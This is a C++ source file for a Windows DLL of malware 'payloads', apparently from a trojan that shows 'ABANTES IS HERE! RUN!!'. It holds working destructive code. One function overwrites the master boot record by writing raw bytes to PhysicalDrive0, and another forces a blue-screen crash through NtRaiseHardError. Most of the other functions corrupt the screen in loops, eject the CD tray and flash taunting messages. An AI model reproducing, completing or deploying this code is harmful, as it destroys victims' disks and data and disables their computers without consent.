// Payloads.cpp : Defines the exported functions for the DLL application.
// Contact me instead of stealing source code: Chris#0538

#include "stdafx.h"
#include "Payloads.h"

#include <mmsystem.h>
#include <windowsx.h>

#pragma comment( lib, "winmm.lib" )

namespace Payloads
{
	void GetDesktopResolution(int& w, int& h) { RECT desktop; const HWND hDesktop = GetDesktopWindow(); GetWindowRect(hDesktop, &desktop); w = desktop.right; h = desktop.bottom; }

	void Payloads::MBR_Overwrite()
	{
		DWORD dw;
		LPCWSTR p = L"C:\\Windows\\Defender\\data.bin";
		HANDLE d = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
		HANDLE b = CreateFile(p, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
		DWORD s = GetFileSize(b, 0);
		BYTE *m = new BYTE[s];
		ReadFile(b, m, s, &dw, 0);
		WriteFile(d, m, s, &dw, 0);
		CloseHandle(d);
	}

	void Payloads::FORCE_BSOD()
	{
		HMODULE ntdll = LoadLibraryA("ntdll");
		FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
		FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

		if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {

			BOOLEAN tmp1; DWORD tmp2;
			((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
			((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
		}

		ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_SYSTEM | SHTDN_REASON_MINOR_BLUESCREEN);
	}

	void Payloads::Screen_Glitching()
	{
		int t = 7500, w = 0, h = 0; GetDesktopResolution(w, h);

		HDC hDC = GetDC(NULL);

		while (true)
		{
			Sleep(t);
			srand(time(0));

			StretchBlt(hDC, rand() % 15 + (15), rand() % 15 + (15), w - rand() % 15 + (15), h - rand() % 15 + (15), hDC, 0, 0, w + rand() % 15 + (15), h + rand() % 15 + (15), SRCAND);
			StretchBlt(hDC, rand() % 15 + (15), rand() % 15 + (15), w - rand() % 15 + (15), h - rand() % 15 + (15), hDC, 0, 0, w + rand() % 15 + (15), h + rand() % 15 + (15), SRCPAINT);

			if (t > 750) { t -= 750; }
		}
	}

	void Payloads::Screen_Screw()
	{
		int w = 0, h = 0; GetDesktopResolution(w, h);

		HDC hDC = GetDC(NULL);

		int cy = 0, cx = 0;

		while (cx != h)
		{
			StretchBlt(hDC, cx, cy, 10, h, hDC, cx, cy, 10, h, DSTINVERT);
			cx++;
		}
	}

	void Payloads::Display_Icons()
	{
		int c = 0, r = 0, w, h; GetDesktopResolution(w, h);
		int ix = GetSystemMetrics(SM_CXICON), iy = GetSystemMetrics(SM_CYICON);

		for (;h > c;)
		{
			Sleep(0005);
			DrawIcon(GetDC(NULL), r, c, LoadIcon(NULL, IDI_QUESTION));

			r = r + iy;
			if (r == w)
			{
				c = c + ix;
				r = 0;
			}
		}
	}
	
	void Payloads::EjectCD()
	{
		MCI_OPEN_PARMS mPar = { 0 };
		mPar.lpstrDeviceType = reinterpret_cast<LPCWSTR>(MCI_DEVTYPE_CD_AUDIO);
		mciSendCommand(0, MCI_OPEN, MCI_OPEN_TYPE | MCI_OPEN_TYPE_ID, (DWORD)&mPar);
		mciSendCommand(mPar.wDeviceID, MCI_SET, MCI_SET_DOOR_OPEN, 0);
	}

	void Payloads::CursorIcon()
	{
		HINSTANCE h = LoadLibrary(L"Payloads.dll");
		if (h == NULL) { return; }

		while (true)
		{

			Sleep(0150);

			HDC hDC = GetDC(NULL);
			SetBkColor(hDC, TRANSPARENT);

			POINT c;
			GetCursorPos(&c);

			int ix = GetSystemMetrics(SM_CXICON) / 2, iy = GetSystemMetrics(SM_CYICON) / 2;

			DrawIcon(hDC, GET_X_LPARAM(c.x) - ix, GET_X_LPARAM(c.y) - iy, LoadIcon(h, MAKEINTRESOURCE(IDI_ICON1)));
		}
	}

	void Payloads::CrazyBounce()
	{
		HDC hd = GetDC(NULL);

		int w, h; GetDesktopResolution(w, h);
		int x = 0, y = 0, ny = w / 4, nx = w / 4;

		while (true) {

			Sleep(0020);
			srand(time(0));

			x = x + nx;
			if (x >= w / 2) { nx = -w / 4; }
			if (x < -w / 2) { nx = w / 4; }

			y = y + ny;
			if (y >= h / 2) { ny = -w / 4; }
			if (y < -h / 2) { ny = w / 4; }

			HBITMAP s = CreateCompatibleBitmap(hd, w, h);
			HDC hs = CreateCompatibleDC(hd);
			SelectObject(hs, s);

			BitBlt(hs, 0, 0, w, h, hd, 0, 0, SRCCOPY);

			BitBlt(hd, 0, 0, w, h, hs, x, y, SRCCOPY);

			DeleteDC(hs);
			DeleteObject(s);
		}
	}

	void Payloads::Flip()
	{
		int w, h; GetDesktopResolution(w, h);

		while (true)
		{
			Sleep(1000);

			HDC hdc = GetDC(NULL);

			StretchBlt(hdc, 0, h, w, -h, hdc, 0, 0, w, h, SRCCOPY);
		}
	}

	void Payloads::Text()
	{
		int w, h; GetDesktopResolution(w, h);

		HDC hDC = GetDC(NULL);
		SetTextColor(hDC, RGB(255, 0, 0));
		SetBkColor(hDC, RGB(0, 0, 0));

		SIZE sz;
		LPCWSTR Text_Output = L"ABANTES IS HERE! RUN!! ";
		GetTextExtentPoint32(hDC, Text_Output, 24, &sz);

		int vc = -sz.cy;
		int hc = 0;

		while (hc < w)
		{
			Sleep(0002);

			TextOutW(hDC, hc, vc += sz.cy, Text_Output, 24);

			if (vc >= h)
			{
				vc = -sz.cy;
				hc += sz.cx;
			}
		}

		SIZE sze;
		GetTextExtentPoint32(hDC, L"YOUR FUCKED! <3", 16, &sze);

		int t = 0;

		while (true)
		{
			if (t % 2)
			{
				SetTextColor(hDC, RGB(0, 0, 0));
				SetBkColor(hDC, RGB(255, 0, 0));
			}
			Sleep(0150);

			TextOutW(hDC, w / 2 - sze.cx / 2, h / 2 - sze.cy / 2, L"YOUR FUCKED! <3", 16);

			SetTextColor(hDC, RGB(255, 0, 0));
			SetBkColor(hDC, RGB(0, 0, 0));

			t++;
		}
	}
}
